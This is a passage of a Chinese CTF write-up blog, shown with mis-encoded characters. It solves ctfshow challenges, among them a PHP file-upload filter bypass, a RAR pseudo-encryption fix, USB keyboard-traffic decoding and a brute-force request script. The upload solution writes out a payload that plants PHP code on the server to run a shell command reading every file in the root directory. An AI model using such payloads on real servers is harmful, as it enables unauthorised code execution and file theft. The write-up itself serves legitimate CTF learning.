class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å®¡è®¡ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1ã€å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯å¯¹<span class="hljs-variable">$data</span>å˜é‡è¿›è¡Œäº†è¿‡æ»¤<br>2ã€ä½¿ç”¨&lt;?=?&gt; çŸ­æ ‡ç­¾å³å¯ç»•è¿‡phpç„¶åè¾“å‡º<br>3ã€ç”¨åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤<br>4ã€è¿‡æ»¤äº†ç©ºæ ¼,ç”¨%09ä»£æ›¿ç©ºæ ¼<br></code></pre></td></tr></table></figure><p>æ ¹æ®æºç ï¼Œå…ˆæŸ¥çœ‹å½“å‰ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°è¯•è¯»å–æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure><p>æœ€åè®¿é—®<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="MISC-æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"><a href="#MISC-æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„" class="headerlink" title="MISC-æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"></a>MISC-æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„</h2><p>é¢˜ç›®æè¿°ï¼šä¼¼ä¹æœ‰ä¿¡æ¯è¢«éšè—äº†ã€‚</p><p>æ‰“å¼€rarå‹ç¼©åŒ…æ–‡ä»¶å—æŸï¼Œå¯èƒ½å­˜åœ¨RARä¼ªåŠ å¯†ï¼ŒæŒ‰ç…§<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1nearå¸ˆå‚…çš„åšå®¢</a>ï¼Œå°†24å­—èŠ‚å¤„çš„84æ”¹ä¸º80å³å¯<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£å‹å‹ç¼©åŒ…å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹wpå‘ç°æ˜¯javaç›²æ°´å°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¾—åˆ°å£ä»¤<code>gnibgnib</code>ï¼Œè§£å‹å¾—åˆ°bingbing.pcapngæµé‡åŒ…ï¼Œå‘ç°æ•°æ®æ˜¯16ä½ï¼Œæ‰€ä»¥æ˜¯USBé”®ç›˜æµé‡<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>tsharkæå–USBæµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‰”é™¤ç©ºè¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ©ç”¨è„šæœ¬åŠ ä¸Šå†’å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># é”®ç›˜æµé‡çš„è¯lenæ”¹ä¸º16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é€šç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>å› ä¸º[DEL]æ˜¯åˆ é™¤é”®ï¼Œæ‰€ä»¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬å°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshowæ¸”äººæ¯"><a href="#ctfshowæ¸”äººæ¯" class="headerlink" title="ctfshowæ¸”äººæ¯"></a>ctfshowæ¸”äººæ¯</h1><h2 id="ç­¾åˆ°æŠ½å¥–"><a href="#ç­¾åˆ°æŠ½å¥–" class="headerlink" title="ç­¾åˆ°æŠ½å¥–"></a>ç­¾åˆ°æŠ½å¥–</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>flagä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä¸­æ–‡ä¹Ÿå¯èƒ½æ˜¯è‹±æ–‡åŠå…¶ä»–å°ä¼—è¯­è¨€å­—ç¬¦<br></code></pre></td></tr></table></figure><h2 id="æ„Ÿå—ä¸‹æ°”æ°›"><a href="#æ„Ÿå—ä¸‹æ°”æ°›" class="headerlink" title="æ„Ÿå—ä¸‹æ°”æ°›"></a>æ„Ÿå—ä¸‹æ°”æ°›</h2><p>flagæ˜¯ctfshow{[0-9]{9}}</p><p>æ­£åˆ™åŒ¹é…ï¼Œç¬¦åˆæ¡ä»¶çš„éƒ½å¯ä»¥ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure><h2 id="ç¥ä»™å§å§"><a href="#ç¥ä»™å§å§" class="headerlink" title="ç¥ä»™å§å§"></a>ç¥ä»™å§å§</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»æ‹œï¼ŒæŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¼ å‚numè¿›è¡Œçˆ†ç ´ï¼Œæ ¹æ®æç¤ºnumåœ¨1-1000å†…<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>éƒ½æ˜¯å‡flagï¼Œä¸€ç›´å¾€ä¸‹ç¿»<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¼–å†™è„šæœ¬è¿›è¡Œçˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="é˜¿æ‹‰ä¸"><a href="#é˜¿æ‹‰ä¸" class="headerlink" title="é˜¿æ‹‰ä¸"></a>é˜¿æ‹‰ä¸</h2><p>æƒ³è¦å•¥å°±æœ‰å•¥</p><p>å¥½å®¶ä¼™ï¼Œæ€ä¹ˆä¸ç»™flagï¼Œä¸æ˜¯è¯´æƒ³è¦å•¥å°±æœ‰å•¥å—ï¼Ÿ<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­é—®ï¼Œè¿˜æ˜¯æ²¡æœ‰<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>burpæŠ“åŒ…ä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆï¼Œçœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpï¼Œå¯ä»¥ç›´æ¥é—®flagæ¯ä¸€ä½æ˜¯ä»€ä¹ˆï¼Ÿï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œè¿™ä¹Ÿè¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ€»å…±45ä½<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‹¼æ¥èµ·æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure><h2 id="è¿·"><a href="#è¿·" class="headerlink" title="è¿·"></a>è¿·</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®é¶æœºåœ°å€<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œçœ‹äº†ç¾¤é‡Œè¯´ç›´æ¥è®¿é—®/flag<br><img 